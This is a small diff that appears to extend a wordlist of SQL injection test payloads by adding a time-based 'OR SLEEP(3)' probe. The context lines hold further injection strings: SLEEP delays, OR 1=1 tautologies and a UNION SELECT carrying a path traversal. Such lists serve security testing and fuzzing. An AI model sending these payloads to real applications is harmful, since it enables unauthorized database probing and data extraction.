@@ -37,6 +37,7 @@
 1) OR SLEEP(0)-- -
 1) OR SLEEP(0.01)-- -
 1) OR SLEEP(0.3)-- -
+1) OR SLEEP(3)-- -
 123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
 99' OR 1=1-- -
 99' OR 5=1-- -
